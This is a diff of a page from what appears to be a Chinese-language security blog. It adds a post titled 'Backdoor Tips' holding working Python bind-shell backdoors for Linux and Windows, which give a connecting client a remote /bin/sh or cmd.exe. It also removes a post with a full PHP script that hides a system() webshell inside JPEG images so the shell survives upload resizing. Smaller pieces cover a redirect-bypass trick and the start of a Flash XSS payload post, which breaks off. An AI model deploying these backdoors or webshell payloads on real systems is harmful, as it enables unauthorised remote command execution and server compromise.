@@ -263,6 +263,293 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/08/24/Backdoor-Tips/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="xl7dev">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="xl7dev">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/08/24/Backdoor-Tips/" itemprop="url">
+                  Backdoor Tips
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Posted on</span>
+            <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-08-24T14:46:29+08:00">
+              2016-08-24
+            </time>
+
+            &nbsp;|&nbsp;
+
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-check-o"></i>
+            </span>
+            <time title="Post modified" itemprop="dateModified" datetime="2016-08-24T19:31:50+08:00">
+              2016-08-24
+            </time>
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/08/24/Backdoor-Tips/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/08/24/Backdoor-Tips/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+          
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="正向backdoor"><a href="#正向backdoor" class="headerlink" title="正向backdoor"></a>正向backdoor</h3><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><blockquote>
+<p>backdoor.py</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from socket import *</span><br><span class="line">import subprocess</span><br><span class="line">import os, threading, sys, time</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    server=socket(AF_INET,SOCK_STREAM)</span><br><span class="line">    server.bind((&apos;0.0.0.0&apos;,11))</span><br><span class="line">    server.listen(5)</span><br><span class="line">    print &apos;waiting for connect&apos;</span><br><span class="line">    talk, addr = server.accept()</span><br><span class="line">    print &apos;connect from&apos;,addr</span><br><span class="line">    proc = subprocess.Popen([&quot;/bin/sh&quot;,&quot;-i&quot;],stdin=talk,stdout=talk,stderr=talk, shell=True)</span><br></pre></td></tr></table></figure>
+<h4 id="Window"><a href="#Window" class="headerlink" title="Window"></a>Window</h4><blockquote>
+<p>backdoor.py</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from socket import *</span><br><span class="line">import subprocess</span><br><span class="line">import os, threading</span><br><span class="line"></span><br><span class="line">def send(talk, proc):</span><br><span class="line">    import time</span><br><span class="line">    while True:</span><br><span class="line">        msg = proc.stdout.readline()</span><br><span class="line">        talk.send(msg)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    server=socket(AF_INET,SOCK_STREAM)</span><br><span class="line">    server.bind((&apos;0.0.0.0&apos;,11))</span><br><span class="line">    server.listen(5)</span><br><span class="line">    print &apos;waiting for connect&apos;</span><br><span class="line">    talk, addr = server.accept()</span><br><span class="line">    print &apos;connect from&apos;,addr</span><br><span class="line">    proc = subprocess.Popen(&apos;cmd.exe /K&apos;,stdin=subprocess.PIPE,stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)</span><br><span class="line">    t = threading.Thread(target = send, args = (talk, proc))</span><br><span class="line">    t.setDaemon(True)</span><br><span class="line">    t.start()</span><br><span class="line">    while True:</span><br><span class="line">        cmd=talk.recv(1024)</span><br><span class="line">        proc.stdin.write(cmd)</span><br><span class="line">        proc.stdin.flush()</span><br><span class="line">    server.close()</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/08/23/Bypass-header-function/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="xl7dev">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="xl7dev">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/08/23/Bypass-header-function/" itemprop="url">
+                  Bypass header function
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Posted on</span>
+            <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-08-23T12:29:06+08:00">
+              2016-08-23
+            </time>
+
+            &nbsp;|&nbsp;
+
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-check-o"></i>
+            </span>
+            <time title="Post modified" itemprop="dateModified" datetime="2016-08-23T12:52:28+08:00">
+              2016-08-23
+            </time>
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/08/23/Bypass-header-function/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/08/23/Bypass-header-function/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+          
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="0x01-Code"><a href="#0x01-Code" class="headerlink" title="0x01 Code"></a>0x01 Code</h3><blockquote>
+<p><a href="http://www.bypassheader.com/index.php" target="_blank" rel="external">http://www.bypassheader.com/index.php</a></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    session_start();</span><br><span class="line">    if($_SESSION(&apos;bypass&apos;))&#123;</span><br><span class="line">        echo &apos;ok&apos;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        header(&apos;Location: http://www.baidu.com/&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;bypass header&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-firefox-NoRedirect-plugins"><a href="#0x02-firefox-NoRedirect-plugins" class="headerlink" title="0x02 firefox NoRedirect plugins"></a>0x02 firefox NoRedirect plugins</h3><p>Install <a href="https://addons.mozilla.org/zh-CN/firefox/addon/noredirect/" target="_blank" rel="external">NoRedirect</a> plugins</p>
+<blockquote>
+<p>usage</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>regex</th>
+<th>referer</th>
+<th>allow</th>
+<th>DNS Error</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>^<a href="http://www\.bypassheader\.com" target="_blank" rel="external">http://www\.bypassheader\.com</a></td>
+<td>√</td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
   <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/08/09/SQLMAP-Dns-Injection/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1532,386 +1819,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/06/17/Bypass-imagecopyresampled-and-imagecopyresized-generate-PHP-Webshell/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="xl7dev">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="xl7dev">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/06/17/Bypass-imagecopyresampled-and-imagecopyresized-generate-PHP-Webshell/" itemprop="url">
-                  Bypass imagecopyresampled and imagecopyresized generate PHP Webshell 
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">Posted on</span>
-            <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-06-17T23:51:13+08:00">
-              2016-06-17
-            </time>
-
-            &nbsp;|&nbsp;
-
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-check-o"></i>
-            </span>
-            <time title="Post modified" itemprop="dateModified" datetime="2016-06-23T01:59:30+08:00">
-              2016-06-23
-            </time>
-            
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/06/17/Bypass-imagecopyresampled-and-imagecopyresized-generate-PHP-Webshell/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/06/17/Bypass-imagecopyresampled-and-imagecopyresized-generate-PHP-Webshell/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-          
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <blockquote>
-<p>修改如下png为php扩展</p>
-</blockquote>
-<p><a href="https://www.idontplaydarts.com/images/xsspng.png" target="_blank" rel="external">XSSPNG</a><br><a href="https://www.idontplaydarts.com/images/phppng.png" target="_blank" rel="external">PHPPNG</a></p>
-<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	/*</span><br><span class="line"></span><br><span class="line">	The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span><br><span class="line">	It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class="line"></span><br><span class="line">	1) Upload an arbitrary image via secured files upload script</span><br><span class="line">	2) Save the processed image and launch:</span><br><span class="line">	jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class="line"></span><br><span class="line">	In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class="line"></span><br><span class="line">	Since the most straightforward injection method is used, the following problems can occur:</span><br><span class="line">	1) After the second processing the injected data may become partially corrupted.</span><br><span class="line">	2) The jpg_payload.php script outputs &quot;Something&apos;s wrong&quot;.</span><br><span class="line">	If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class="line"></span><br><span class="line">	Sergey Bobrov @Black2Fan.</span><br><span class="line"></span><br><span class="line">	See also:</span><br><span class="line">	https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><br><span class="line"></span><br><span class="line">	*/</span><br><span class="line"></span><br><span class="line">	$miniPayload = &apos;&lt;?php system($_GET[c]);?&gt;&apos;;</span><br><span class="line"></span><br><span class="line">	if(!extension_loaded(&apos;gd&apos;) || !function_exists(&apos;imagecreatefromjpeg&apos;)) &#123;</span><br><span class="line">    	die(&apos;php-gd is not installed&apos;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if(!isset($argv[1])) &#123;</span><br><span class="line">		die(&apos;php jpg_payload.php &lt;jpg_name.jpg&gt;&apos;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	set_error_handler(&quot;custom_error_handler&quot;);</span><br><span class="line"></span><br><span class="line">	for($pad = 0; $pad &lt; 1024; $pad++) &#123;</span><br><span class="line">		$nullbytePayloadSize = $pad;</span><br><span class="line">		$dis = new DataInputStream($argv[1]);</span><br><span class="line">		$outStream = file_get_contents($argv[1]);</span><br><span class="line">		$extraBytes = 0;</span><br><span class="line">		$correctImage = TRUE;</span><br><span class="line"></span><br><span class="line">		if($dis-&gt;readShort() != 0xFFD8) &#123;</span><br><span class="line">			die(&apos;Incorrect SOI marker&apos;);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;</span><br><span class="line">			$marker = $dis-&gt;readByte();</span><br><span class="line">			$size = $dis-&gt;readShort() - 2;</span><br><span class="line">			$dis-&gt;skip($size);</span><br><span class="line">			if($marker === 0xDA) &#123;</span><br><span class="line">				$startPos = $dis-&gt;seek();</span><br><span class="line">				$outStreamTmp =</span><br><span class="line">					substr($outStream, 0, $startPos) .</span><br><span class="line">					$miniPayload .</span><br><span class="line">					str_repeat(&quot;\0&quot;,$nullbytePayloadSize) .</span><br><span class="line">					substr($outStream, $startPos);</span><br><span class="line">				checkImage(&apos;_&apos;.$argv[1], $outStreamTmp, TRUE);</span><br><span class="line">				if($extraBytes !== 0) &#123;</span><br><span class="line">					while((!$dis-&gt;eof())) &#123;</span><br><span class="line">						if($dis-&gt;readByte() === 0xFF) &#123;</span><br><span class="line">							if($dis-&gt;readByte !== 0x00) &#123;</span><br><span class="line">								break;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					$stopPos = $dis-&gt;seek() - 2;</span><br><span class="line">					$imageStreamSize = $stopPos - $startPos;</span><br><span class="line">					$outStream =</span><br><span class="line">						substr($outStream, 0, $startPos) .</span><br><span class="line">						$miniPayload .</span><br><span class="line">						substr(</span><br><span class="line">							str_repeat(&quot;\0&quot;,$nullbytePayloadSize).</span><br><span class="line">								substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">							0,</span><br><span class="line">							$nullbytePayloadSize+$imageStreamSize-$extraBytes) .</span><br><span class="line">								substr($outStream, $stopPos);</span><br><span class="line">				&#125; elseif($correctImage) &#123;</span><br><span class="line">					$outStream = $outStreamTmp;</span><br><span class="line">				&#125; else &#123;</span><br><span class="line">					break;</span><br><span class="line">				&#125;</span><br><span class="line">				if(checkImage(&apos;payload_&apos;.$argv[1], $outStream)) &#123;</span><br><span class="line">					die(&apos;Success!&apos;);</span><br><span class="line">				&#125; else &#123;</span><br><span class="line">					break;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	unlink(&apos;payload_&apos;.$argv[1]);</span><br><span class="line">	die(&apos;Something\&apos;s wrong&apos;);</span><br><span class="line"></span><br><span class="line">	function checkImage($filename, $data, $unlink = FALSE) &#123;</span><br><span class="line">		global $correctImage;</span><br><span class="line">		file_put_contents($filename, $data);</span><br><span class="line">		$correctImage = TRUE;</span><br><span class="line">		imagecreatefromjpeg($filename);</span><br><span class="line">		if($unlink)</span><br><span class="line">			unlink($filename);</span><br><span class="line">		return $correctImage;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;</span><br><span class="line">		global $extraBytes, $correctImage;</span><br><span class="line">		$correctImage = FALSE;</span><br><span class="line">		if(preg_match(&apos;/(\d+) extraneous bytes before marker/&apos;, $errstr, $m)) &#123;</span><br><span class="line">			if(isset($m[1])) &#123;</span><br><span class="line">				$extraBytes = (int)$m[1];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	class DataInputStream &#123;</span><br><span class="line">		private $binData;</span><br><span class="line">		private $order;</span><br><span class="line">		private $size;</span><br><span class="line"></span><br><span class="line">		public function __construct($filename, $order = false, $fromString = false) &#123;</span><br><span class="line">			$this-&gt;binData = &apos;&apos;;</span><br><span class="line">			$this-&gt;order = $order;</span><br><span class="line">			if(!$fromString) &#123;</span><br><span class="line">				if(!file_exists($filename) || !is_file($filename))</span><br><span class="line">					die(&apos;File not exists [&apos;.$filename.&apos;]&apos;);</span><br><span class="line">				$this-&gt;binData = file_get_contents($filename);</span><br><span class="line">			&#125; else &#123;</span><br><span class="line">				$this-&gt;binData = $filename;</span><br><span class="line">			&#125;</span><br><span class="line">			$this-&gt;size = strlen($this-&gt;binData);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		public function seek() &#123;</span><br><span class="line">			return ($this-&gt;size - strlen($this-&gt;binData));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		public function skip($skip) &#123;</span><br><span class="line">			$this-&gt;binData = substr($this-&gt;binData, $skip);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		public function readByte() &#123;</span><br><span class="line">			if($this-&gt;eof()) &#123;</span><br><span class="line">				die(&apos;End Of File&apos;);</span><br><span class="line">			&#125;</span><br><span class="line">			$byte = substr($this-&gt;binData, 0, 1);</span><br><span class="line">			$this-&gt;binData = substr($this-&gt;binData, 1);</span><br><span class="line">			return ord($byte);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		public function readShort() &#123;</span><br><span class="line">			if(strlen($this-&gt;binData) &lt; 2) &#123;</span><br><span class="line">				die(&apos;End Of File&apos;);</span><br><span class="line">			&#125;</span><br><span class="line">			$short = substr($this-&gt;binData, 0, 2);</span><br><span class="line">			$this-&gt;binData = substr($this-&gt;binData, 2);</span><br><span class="line">			if($this-&gt;order) &#123;</span><br><span class="line">				$short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);</span><br><span class="line">			&#125; else &#123;</span><br><span class="line">				$short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);</span><br><span class="line">			&#125;</span><br><span class="line">			return $short;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		public function eof() &#123;</span><br><span class="line">			return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/06/17/Flash-files-Vulnerable-Payload/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="xl7dev">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="xl7dev">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/06/17/Flash-files-Vulnerable-Payload/" itemprop="url">
-                  Flash files Vulnerable Payload
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">Posted on</span>
-            <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-06-17T11:27:37+08:00">
-              2016-06-17
-            </time>
-
-            &nbsp;|&nbsp;
-
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-check-o"></i>
-            </span>
-            <time title="Post modified" itemprop="dateModified" datetime="2016-09-06T18:50:07+08:00">
-              2016-09-06
-            </time>
-            
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/06/17/Flash-files-Vulnerable-Payload/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/06/17/Flash-files-Vulnerable-Payload/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-          
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h4 id="SWFIntruder"><a href="#SWFIntruder" class="headerlink" title="SWFIntruder"></a><a href="https://github.com/irsdl/updated-SWFIntruder" target="_blank" rel="external">SWFIntruder</a></h4><p><a href="https://gist.github.com/cure53/df34ea68c26441f3ae98f821ba1feb9c#intro" target="_blank" rel="external">https://gist.github.com/cure53/df34ea68c26441f3ae98f821ba1feb9c#intro</a></p>
-<h4 id="Flashbang"><a href="#Flashbang" class="headerlink" title="Flashbang"></a>Flashbang</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; git clone https://github.com/cure53/Flashbang --recursive</span><br><span class="line">&gt; cd Flashbang/shumway</span><br><span class="line">&gt; git submodule init</span><br><span class="line">&gt; make bootstrap</span><br><span class="line">&gt; python -m SimpleHTTPServer 80     # 在Flashbang目录下启动一个Web服务,访问http://127.0.0.1/src/flashbang.html</span><br></pre></td></tr></table></figure>
-<h4 id="FFDec"><a href="#FFDec" class="headerlink" title="FFDec"></a>FFDec</h4><p><a href="https://github.com/jindrapetrik/jpexs-decompiler/releases" target="_blank" rel="external">FFDec</a></p>
-<h4 id="Vul-function"><a href="#Vul-function" class="headerlink" title="Vul function"></a>Vul function</h4><h5 id="1-URLRequest-–-gt-getURL"><a href="#1-URLRequest-–-gt-getURL" class="headerlink" title="1) URLRequest –&gt; getURL"></a>1) URLRequest –&gt; getURL</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// as3.0 version</span><br><span class="line">navigateToURL(new URLRequest(link), &quot;_self&quot;);</span><br><span class="line">//as2.0 version</span><br><span class="line">getURL(link,&quot;_self&quot;);</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.target.com/movie.swf?link=javascript:alert(1)</span><br></pre></td></tr></table></figure>
